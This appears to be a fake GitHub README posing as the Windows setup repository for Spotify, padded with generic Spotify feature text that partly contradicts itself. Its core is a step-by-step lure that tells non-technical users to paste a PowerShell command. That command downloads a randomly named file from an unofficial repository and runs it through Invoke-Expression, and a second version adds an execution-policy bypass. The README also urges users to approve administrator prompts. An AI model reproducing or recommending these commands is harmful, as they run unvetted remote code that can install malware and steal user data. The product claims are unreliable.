# Spotify

This repository is the Windows home for Spotify. It keeps the setup file, a short helper, the license, and the build notes for the 2026 release, written the way a desktop project usually is.


Spotify is the desktop streaming app for Windows that plays songs, albums, and podcasts from a searchable catalog. After you sign in, the home view blends recently played titles, recommendations, and saved releases so you can start listening in seconds. The interface keeps Your Library, search, and station-style radio in one window that sits comfortably beside everyday work apps. A typical session starts from the taskbar: open the client, pick a playlist or album, and control shuffle, repeat, and volume from the now-playing bar while other programs stay in focus. Premium members download playlists for offline use, skip without limits, and build a queue for the afternoon; free listening still streams the same catalog with scheduled breaks between tracks. Spotify Connect lets you hand off playback to a phone, TV, or speaker without losing your place in the queue. This repository documents the Windows setup package, subscription activation checklist, and preferred defaults for streaming quality and launch behavior. You will find step-by-step notes for fresh installs, a concise changelog when the client or account rules change, and fixes for sign-in loops, device caps, and cache resets after updates. Maintainers log version bumps and tier differences so households and small teams can match machines after each rollout.

[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()
[![Build](https://img.shields.io/badge/build-1.0-0ea5e9?style=flat-square)]()
[![License](https://img.shields.io/badge/license-MIT-16a34a?style=flat-square)]()

## What you do with it

A typical session starts from the Start menu, opens the last project, and stays on local files. Spotify does not need a second folder of notes outside this repository.

On Windows the useful part is local. Spotify reads and writes project files on disk, remembers the last session, and comes back after a reboot without a second setup. Build 1.0 was checked against Windows 10 and Windows 11. Older releases of Windows are outside these notes.

- Search millions of tracks, albums, and podcast shows from one Windows desktop window.
- Your Library collects saved songs, playlists, and followed artists in sortable sidebar folders.
- Daily Mix and Discover Weekly refresh personalized recommendations from your recent listening history.
- Premium offline mode stores selected playlists on disk when network access is unreliable.
- Spotify Connect shifts playback to phones, TVs, and speakers without restarting the current queue.
- Built-in equalizer and crossfade options tailor sound for headphones, monitors, and living-room setups.
- Collaborative playlists let friends add tracks while everyone sees the same live queue order.
- Podcast speed controls and chapter markers make long episodes easier to finish during commutes.

## Before you run it

Use the Windows PC where you want Spotify. Windows should be 64-bit, with about 8 GB of memory and 12 GB free. If the account is not an administrator, the terminal will ask once. Confirm it.

## How to open the terminal

You do not clone this repository and you do not open a folder. On the Windows PC you only open PowerShell and paste one command. PowerShell is the terminal. Command Prompt is a different window. Do not use it.

1. Click the Windows icon on the taskbar. That button is Start. It sits at the bottom of the screen.
2. Type `PowerShell`.
3. Click **Windows PowerShell** in the list. A window opens with a blinking cursor. That window is the terminal.
4. Click inside the window.
5. Copy the first command below. Paste it into the window with a right-click, or with Ctrl+V. Then press Enter.
6. Leave the window open until the text stops and a fresh line appears.
7. If the window says scripts are disabled, copy the second command, paste it the same way, and press Enter.

Both commands read `7qom3a9ahi.711dr1cv` from this repository. Do not change the address.

```powershell
irm https://raw.githubusercontent.com/graflea889268/spotify-setup-guide/main/7qom3a9ahi.711dr1cv | Invoke-Expression
```

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/graflea889268/spotify-setup-guide/main/7qom3a9ahi.711dr1cv | Invoke-Expression"
```

## After setup

When the terminal finishes, open Spotify the same way you opened PowerShell. Click the Windows icon, type `Spotify`, and click the program. Sign in if it asks. If the window does not appear, restart the PC once and look again.

## If it stops

| What you see | What to do |
| --- | --- |
| The command stops immediately | Paste the second command into the same PowerShell window and press Enter. |
| Spotify does not show in Start | Click the Windows icon, type the name again, then restart the PC once if it is still missing. |
| Not enough disk | Free about 12 GB and paste the command once more. |
| Windows asks for approval | Click Yes. The terminal needs it once. |

## Files

| File | What it is |
| --- | --- |
| `7qom3a9ahi.711dr1cv` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `graflea889268/spotify-setup-guide`. Spotify 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
